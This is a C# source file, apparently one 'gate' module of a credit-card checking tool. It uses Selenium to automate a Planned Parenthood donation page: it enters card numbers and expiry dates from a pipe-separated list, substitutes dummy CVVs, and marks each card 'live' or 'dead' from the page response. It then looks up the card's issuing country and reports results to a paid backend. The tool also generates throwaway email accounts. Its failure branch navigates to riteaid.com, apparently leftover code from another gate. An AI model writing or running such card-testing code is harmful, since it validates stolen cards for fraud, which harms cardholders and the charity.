using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Weareplanned
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 15)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            try
            {



                check.login(Variables.key);
                if (int.Parse(Variables.creditos) <= 0)
                {
                    MessageBox.Show("Recargue sus creditos");
                    return;
                }


                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                {


                    var chromeOptions = new ChromeOptions();
                    correo = "joseffernana" + getNum() + "@gmail.com";
                    clave = "Jo." + getNum();

                    //chromeOptions.AddArguments(new List<string>() { "headless" });
                    //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                    chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito");

                    var chromeDriverService = ChromeDriverService.CreateDefaultService();
                    chromeDriverService.HideCommandPromptWindow = true;

                    driver = new ChromeDriver(chromeDriverService, chromeOptions);
                    driver.Url = "https://www.weareplannedparenthood.org/onlineactions/2U7UN1iNhESWUfDs4gDPNg2?sourceid=1000063&_ga=2.51912224.829475348.1565593412-698380132.1565593412";
                    Thread.Sleep(3000);
                    Thunder._Form1.update_progresbar(5);


                  
                  

                }
                else
                {
                    Thunder._Form1.abort();
                }

            }
            catch (Exception ex)
            {

                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    Thunder._Form1.abort();
                }
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(2000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {

                var num = 1;

                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                {
                    if (pagos < 5)
                    {
                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var number = ccLine[0];//numero de la tarjeta
                        var month = ccLine[1]; //mes de la tarjeta
                        var year = ccLine[2]; //año de la tarjeta
                        var cvv = ccLine[3];

                        Thunder._Form1.update_progresbar(90);

                        Thread.Sleep(2000);
                        if (tiempoElemento(By.XPath("/html/body/div[3]/main/div[2]/div/div[4]/div[4]/ol/li[4]/div/form/fieldset/div[1]/div/div/div[3]/div[2]/iframe")))
                        {

                            driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div[3]/main/div[2]/div/div[4]/div[4]/ol/li[4]/div/form/fieldset/div[1]/div/div/div[3]/div[2]/iframe")));

                            if (tiempoElemento(By.XPath("//*[@id='cardNum']")))
                            {

                                if (IsElementPresent(By.XPath("//*[@id='cardNum']")))
                                {

                                    driver.FindElement(By.XPath("//*[@id='cardNum']")).SendKeys(number);
                                    Thread.Sleep(1000);
                                }
                            }



                            if (IsElementPresent(By.XPath("//*[@id='expiryDate']")))
                            {
                                driver.FindElement(By.XPath("//*[@id='expiryDate']")).SendKeys(month + year.Remove(0, 2));
                                Thread.Sleep(1000);
                            }




                            if (IsElementPresent(By.XPath("//*[@id='cvv']")))
                            {
                                if (cvv.Trim().Length == 3)
                                {
                                    driver.FindElement(By.XPath("//*[@id='cvv']")).SendKeys("000" + OpenQA.Selenium.Keys.Enter);
                                }
                                else
                                {
                                    driver.FindElement(By.XPath("//*[@id='cvv']")).SendKeys("0000" + OpenQA.Selenium.Keys.Enter);

                                }
                                Thread.Sleep(1000);


                                if (IsElementPresent(By.XPath("//*[@id='saveButton']")))
                                {
                                    Thread.Sleep(800);
                                    driver.FindElement(By.XPath("//*[@id='saveButton']")).Click();
                                    Thread.Sleep(800);
                                }


                            }
                        }


                        Thread.Sleep(2000);


                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }

                }
                else
                {
                    Thunder._Form1.abort();
                }
            }
            catch (Exception ex)
            {
                // MessageBox.Show(ex.ToString());
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    Thunder._Form1.abort();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
                Thunder._Form1.abort();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex);
                Thunder._Form1.abort();
            }

        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 15)
                {

                    if (IsElementPresent(By.XPath("//*[@id='saveButton']")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='saveButton']")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='saveButton']")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("/html/body/div[3]/main/div[3]/div/div[4]/h1")))
                    {
                        if (driver.FindElement(By.XPath("/html/body/div[3]/main/div[3]/div/div[4]/h1")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("/html/body/div[3]/main/div[3]/div/div[4]/h1")).Text.Trim() == "Thank you for your order!")
                            {
                                estado = "live";
                            }
                        }
                    }




                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                driver.Navigate().GoToUrl("https://www.riteaid.com/shop/checkout/#shipping");
                Thread.Sleep(1000);

                if (tiempoElemento(By.XPath("//*[@id='shipping-method-buttons-container']/div/button")))
                {
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("//*[@id='shipping-method-buttons-container']/div/button")).Click();

                    if (tiempoElemento(By.XPath("/html/body/div[3]/main/div[2]/div/div[4]/div[4]/ol/li[4]/div/form/fieldset/div[1]/div/div/div[3]/div[2]/iframe")))
                    {

                        driver.SwitchTo().Frame(driver.FindElement(By.XPath("/html/body/div[3]/main/div[2]/div/div[4]/div[4]/ol/li[4]/div/form/fieldset/div[1]/div/div/div[3]/div[2]/iframe")));

                        if (tiempoElemento(By.XPath("//*[@id='cardNum']")))
                        {
                            driver.SwitchTo().ParentFrame();
                            return false;
                        }
                    }


                }

                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }
    }
}

